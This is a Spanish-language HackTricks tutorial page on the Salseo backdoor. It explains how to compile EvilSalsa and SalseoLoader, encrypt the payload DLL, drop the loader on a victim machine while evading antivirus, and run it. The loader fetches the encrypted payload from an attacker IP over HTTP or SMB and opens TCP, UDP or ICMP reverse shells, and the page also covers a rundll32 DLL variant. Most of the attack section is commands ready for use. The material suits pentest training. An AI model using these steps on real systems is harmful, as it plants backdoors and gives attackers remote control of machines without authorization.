# Salseo

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Compilando los binarios

Descarga el código fuente desde github y compila **EvilSalsa** y **SalseoLoader**. Necesitarás tener **Visual Studio** instalado para compilar el código.

Compila esos proyectos para la arquitectura de la máquina Windows donde los vas a utilizar (si Windows soporta x64, compílalos para esa arquitectura).

Puedes **seleccionar la arquitectura** dentro de Visual Studio en la pestaña **"Build"** en **"Platform Target".**

(\*\*Si no encuentras estas opciones, presiona en **"Project Tab"** y luego en **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Luego, compila ambos proyectos (Build -> Build Solution) (Dentro de los registros aparecerá la ruta del ejecutable):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Preparar el Backdoor

Primero que nada, necesitarás codificar el **EvilSalsa.dll.** Para hacerlo, puedes usar el script de python **encrypterassembly.py** o puedes compilar el proyecto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo

Salseo is a backdoor that allows an attacker to execute commands on a compromised system. It is written in C# and uses the .NET framework. Salseo can be compiled into an executable or injected into a process. It provides features such as file management, process management, and command execution.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader.**

**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**

## **Ejecutar la puerta trasera**

### **Obteniendo una shell inversa TCP (descargando dll codificada a través de HTTP)**

Recuerda iniciar un nc como oyente de la shell inversa y un servidor HTTP para servir el EvilDalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obteniendo una shell inversa UDP (descargando un dll codificado a través de SMB)**

Recuerda iniciar un nc como oyente de la shell inversa, y un servidor SMB para servir el evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obteniendo una shell inversa ICMP (dll codificada ya dentro de la víctima)**

**Esta vez necesitas una herramienta especial en el cliente para recibir la shell inversa. Descarga:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desactivar Respuestas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Ejecutar el cliente:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro de la víctima, ejecutemos la cosa de salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando SalseoLoader como DLL exportando función principal

Abre el proyecto SalseoLoader usando Visual Studio.

### Agrega antes de la función principal: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instala DllExport para este proyecto

#### **Herramientas** --> **Gestor de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Busca el paquete DllExport (usando la pestaña Examinar), y presiona Instalar (y acepta el mensaje emergente)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

En la carpeta de tu proyecto han aparecido los archivos: **DllExport.bat** y **DllExport\_Configure.bat**

### **D**esinstala DllExport

Presiona **Desinstalar** (sí, es extraño pero confía en mí, es necesario)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Sal de Visual Studio y ejecuta DllExport\_configure**

Simplemente **sal** de Visual Studio

Luego, ve a tu **carpeta de SalseoLoader** y **ejecuta DllExport\_Configure.bat**

Selecciona **x64** (si lo vas a usar dentro de una caja x64, ese fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Espacio de nombres para DllExport**) y presiona **Aplicar**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Abre el proyecto nuevamente con Visual Studio**

**\[DllExport]** ya no debería estar marcado como error

![](<../.gitbook/assets/image (8) (1).png>)

### Compila la solución

Selecciona **Tipo de salida = Biblioteca de clases** (Proyecto --> Propiedades de SalseoLoader --> Aplicación --> Tipo de salida = Biblioteca de clases)

![](<../.gitbook/assets/image (10) (1).png>)

Selecciona **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Compilar --> Destino de la plataforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Para **compilar** la solución: Compilar --> Compilar solución (Dentro de la consola de salida aparecerá la ruta de la nueva DLL)

### Prueba la Dll generada

Copia y pega la Dll donde quieras probarla.

Ejecuta:
```
rundll32.exe SalseoLoader.dll,main
```
Si no aparece ningún error, ¡probablemente tienes un DLL funcional!

## Obtén un shell usando el DLL

No olvides usar un **servidor HTTP** y configurar un **escucha nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
